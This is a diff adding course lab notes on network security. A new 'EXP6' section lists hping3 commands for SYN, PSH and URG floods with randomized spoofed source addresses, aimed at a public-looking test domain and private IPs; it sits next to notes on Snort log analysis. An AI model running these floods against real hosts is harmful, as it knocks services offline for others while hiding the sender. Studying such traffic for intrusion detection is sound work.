@@ -1,4 +1,18 @@
 
+EXP6
+------------ step1: Go in /etc 
+cd /etc 
+step2: sudo apt-get install hping3 -y 
+step3: sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com 
+step4: sudo hping3 -S --flood -V www.hping3testsite.com 
+step5: sudo hping3 -S -P -U --flood -V --rand-source www.hping3testsite.com 
+step6: sudo hping3 10.0.2.15 
+step7: hping3 10.0.2.15 
+step8: sudo ping 10.0.2.15 
+step9: sudo hping3 192.168.43.24 --flood -p 80
+
+
+
 
 EXP7: Aim: To study Intrusion Detection system SNORT 
 and its log analysis. 
@@ -111,5 +125,6 @@ ls
 #we will get md5sum ubuntu-14.04.5.desktop-amd64.isothis file with ls 
 
 md5sum ubuntu-14.04.5.desktop-amd64.iso
+
 
 
